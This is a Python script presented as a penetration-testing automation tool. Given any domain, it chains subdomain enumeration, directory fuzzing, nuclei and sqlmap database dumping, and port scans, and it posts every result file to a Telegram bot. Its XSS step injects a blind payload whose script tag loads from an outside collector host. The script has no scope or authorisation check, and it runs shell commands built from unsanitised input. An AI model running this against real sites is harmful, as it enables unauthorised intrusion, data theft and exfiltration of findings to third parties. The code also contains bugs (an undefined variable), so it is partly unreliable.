import os
import sys
import argparse
import subprocess
import socket
import logging
import random
import requests
import json
import threading
import time
from colorama import Fore, init

# Initialize colorama and logging
init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Path to the configuration file
CONFIG_FILE = 'config.json'

def random_color():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    return random.choice(colors)

def create_target_directory(target):
    base_dir = "target"
    os.makedirs(base_dir, exist_ok=True)
    target_dir = os.path.join(base_dir, target)
    os.makedirs(target_dir, exist_ok=True)
    return target_dir

def check_tool(tool_name):
    result = subprocess.run(['which', tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def get_ip_address(target):
    try:
        ip_address = socket.gethostbyname(target)
        return ip_address
    except socket.error as err:
        logging.error(f"{random_color()}Error getting IP address: {err}")
        return None

def read_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            return config.get('bot_token'), config.get('chat_id')
    return None, None

def write_config(bot_token, chat_id):
    config = {
        'bot_token': bot_token,
        'chat_id': chat_id
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def prompt_for_config():
    logging.info(f"{random_color()}[*] Telegram bot token and chat ID are not configured.")
    bot_token = input("Enter your Telegram bot token: ")
    chat_id = input("Enter your chat ID: ")
    write_config(bot_token, chat_id)
    logging.info(f"{random_color()}Configuration saved successfully!")

def send_telegram_message(message):
    bot_token, chat_id = read_config()
    if bot_token and chat_id:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {'chat_id': chat_id, 'text': message}
        try:
            response = requests.post(url, data=data)
            response.raise_for_status()
        except requests.RequestException as e:
            logging.error(f"{random_color()}Error sending Telegram message: {e}")
    else:
        logging.error(f"{random_color()}Telegram bot token or chat ID is not configured.")

def send_telegram_file(file_path, caption):
    bot_token, chat_id = read_config()
    if bot_token and chat_id:
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                data = {
                    'chat_id': chat_id,
                    'caption': caption
                }
                files = {
                    'document': file
                }
                try:
                    response = requests.post(url, data=data, files=files)
                    response.raise_for_status()
                    logging.info(f"{random_color()}[*] File '{file_path}' sent successfully.")
                except requests.RequestException as e:
                    logging.error(f"{random_color()}Error sending Telegram file: {e}")
        else:
            logging.error(f"{random_color()}File '{file_path}' does not exist.")
    else:
        logging.error(f"{random_color()}Telegram bot token or chat ID is not configured.")

def spinner(stop_event):
    spinner_chars = '|/-\\'
    while not stop_event.is_set():
        for char in spinner_chars:
            if stop_event.is_set():
                break
            sys.stdout.write(f'\r{random_color()}Running... {char}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r')
    sys.stdout.flush()

def run_command(command, tool_name, output_file=None, report_message=None):
    logging.info(f"{random_color()}[*] Running {tool_name}")

    # Create a stop event for the spinner
    stop_event = threading.Event()

    # Start spinner in a separate thread
    spinner_thread = threading.Thread(target=spinner, args=(stop_event,))
    spinner_thread.daemon = True
    spinner_thread.start()

    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if output_file:
            with open(output_file, 'w') as f:
                f.write(result.stdout.decode())
            logging.info(f"{random_color()}[*] {tool_name} completed successfully")
            if report_message:
                send_telegram_message(report_message)
            if os.path.exists(output_file):
                send_telegram_file(output_file, f"{tool_name} results for {target}")
            else:
                logging.error(f"{random_color()}Output file '{output_file}' not found.")
        else:
            logging.info(f"{random_color()}[*] {tool_name} completed successfully without output file.")
    except subprocess.CalledProcessError as e:
        logging.error(f"{random_color()}[!] {tool_name} failed with error: {e.stderr.decode()}")
    except KeyboardInterrupt:
        logging.info("Process was interrupted by the user.")
        sys.exit(1)
    finally:
        # Signal the spinner thread to stop
        stop_event.set()
        spinner_thread.join()  # Ensure the spinner stops

def enum_subdomains(target, target_dir):
    logging.info(f"{random_color()}[*] Enumerating subdomains")
    run_command(f"subfinder -d {target} -all -recursive", "Subfinder",
                output_file=f"{target_dir}/{target}-subdomain.txt",
                report_message=f"Subdomain enumeration for {target} completed.")
    run_command(f"cat {target_dir}/{target}-subdomain.txt | httpx-toolkit -ports 80,8080,8000,8888 -threads 200", "Httpx Toolkit",
                output_file=f"{target_dir}/{target}-subdomains_alive.txt",
                report_message=f"Subdomain alive check for {target} completed.")
    run_command(f"katana -u {target_dir}/{target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target_dir}/{target}-allurls.txt", "Katana",
                output_file=f"{target_dir}/{target}-allurls.txt",
                report_message=f"URL extraction for {target} completed.")
    run_command(f"cat {target_dir}/{target}-allurls.txt | grep -E '\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$' >> {target_dir}/{target}-sensitive.txt", "Sensitive File Extraction",
                output_file=f"{target_dir}/{target}-sensitive.txt",
                report_message=f"Sensitive file extraction for {target} completed.")

def fuzzing(target, target_dir):
    logging.info(f"{random_color()}[*] Fuzzing directories and files")
    run_command(f"dirsearch -u https://{target}/ -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -o {target_dir}/dirsearch-{target}.txt", "Dirsearch",
                output_file=f"{target_dir}/dirsearch-{target}.txt",
                report_message=f"Directory and file fuzzing for {target} completed.")

def xss_finding(target, target_dir):
    logging.info(f"{random_color()}[*] Finding XSS vulnerabilities")
    run_command(f"subfinder -d {target} | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\'><script src=https://xss.report/c/coffinxp></script>' -parameters", "XSS Finding",
                output_file=f"{target_dir}/xss-results.txt",
                report_message=f"XSS vulnerability finding for {target} completed.")

def lfi_finding(target, target_dir):
    logging.info(f"{random_color()}[*] Finding LFI vulnerabilities")
    run_command(f"cat {target_dir}/{target}-allurls.txt | gf lfi | nuclei -tags lfi", "LFI Finding",
                output_file=f"{target_dir}/lfi-results.txt",
                report_message=f"LFI vulnerability finding for {target} completed.")

def nuclei_scan(target, target_dir):
    logging.info(f"{random_color()}[*] Scanning for vulnerabilities with Nuclei")
    run_command(f"nuclei -list {target_dir}/{target}-subdomains_alive.txt -tags cve,osint,tech", "Nuclei Scan",
                output_file=f"{target_dir}/nuclei-results.txt",
                report_message=f"Nuclei scan for {target} completed.")

def sql_injection(target, target_dir):
    logging.info(f"{random_color()}[*] Scanning for SQL injection")
    run_command(f"cat {target_dir}/{target}-allurls.txt | gau | urldedupe | gf sqli", "SQL Injection Generation",
                output_file=f"{target_dir}/sql.txt",
                report_message=f"SQL injection target generation for {target} completed.")
    run_command(f"sqlmap -m {target_dir}/sql.txt --batch --dbs --risk 2 --level 5 --flush-session --random-agent", "SQLmap Scan",
                output_file=f"{target_dir}/sqli.txt",
                report_message=f"SQL injection scanning for {target} completed.")

def gobuster_fuzzing(target, target_dir):
    logging.info(f"{random_color()}[*] Fuzzing with Gobuster")
    run_command(f"gobuster dir -u https://{target} -w /path/to/wordlist.txt", "Gobuster",
                output_file=f"{target_dir}/gobuster-{target}.txt",
                report_message=f"Gobuster fuzzing for {target} completed.")

def port_scan(target, target_dir):
    logging.info(f"{random_color()}[*] Performing port scan")
    subdomains_alive_file = os.path.join(target_dir, f"{target}-subdomains_alive.txt")

    if os.path.exists(subdomains_alive_file) and os.path.getsize(subdomains_alive_file) > 0:
        run_command(f"naabu -list {subdomains_alive_file} -c 50 -nmap-cli 'nmap -sV -sC'", "Naabu Scan",
                    output_file=f"{target_dir}/{target}-naabu-full.txt",
                    report_message=f"Port scan with naabu for {target} completed.")
    else:
        logging.info(f"{random_color()}No alive subdomains found in {subdomains_alive_file}. Performing port scan on the main target.")
        run_command(f"naabu -host {target} -c 50", "Naabu Scan Main Target",
                    output_file=f"{target_dir}/{target}-naabu-full.txt",
                    report_message=f"Port scan with naabu on main target {target} completed.")
        run_command(f"nmap -sV -Pn -d --script=http-enum,firewall-bypass -A {target}", "Nmap Scan",
                    output_file=f"{target_dir}/{target}-nmap.txt",
                    report_message=f"Nmap scan for {target} completed.")

def sort_403_links(target_dir):
    input_file = os.path.join(target_dir, f"dirsearch-{target}.txt")
    output_file = 'sorted_403_links.txt'

    try:
        with open(input_file, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        logging.error(f"{random_color()}The input file '{input_file}' was not found.")
        return

    # Filter out lines with a 403 status code
    fourzerothree_lines = [line for line in lines if line.startswith('403')]

    # Sort the filtered lines by the URL part (after the status code and size)
    sorted_fourzerothree_lines = sorted(fourzerothree_lines, key=lambda x: x.split()[2])

    # Write the sorted lines to a new file
    try:
        with open(output_file, 'w') as file:
            file.writelines(sorted_fourzerothree_lines)
        logging.info(f"{random_color()}Sorted 403 links have been written to '{output_file}'.")
    except IOError as e:
        logging.error(f"{random_color()}An error occurred while writing to the file: {e}")

def main():
    # Check if config is already set up
    bot_token, chat_id = read_config()
    if not bot_token or not chat_id:
        prompt_for_config()

    parser = argparse.ArgumentParser(description="PT Automation Tool")
    parser.add_argument("target", help="Target domain")
    args = parser.parse_args()

    target = args.target
    target_dir = create_target_directory(target)
    ip_address = get_ip_address(target)

    if ip_address:
        logging.info(f"{random_color()}[*] TARGET: {target}")
        logging.info(f"{random_color()}[*] TARGET IP ADDRESS: {ip_address}")

    logging.info(f"{random_color()}[*] Running all tools for domain")
    enum_subdomains(target, target_dir)
    fuzzing(target, target_dir)
    xss_finding(target, target_dir)
    lfi_finding(target, target_dir)
    nuclei_scan(target, target_dir)
    sql_injection(target, target_dir)
    gobuster_fuzzing(target, target_dir)
    port_scan(target, target_dir)

    # Sort and save 403 links
    sort_403_links(target_dir)

if __name__ == "__main__":
    main()
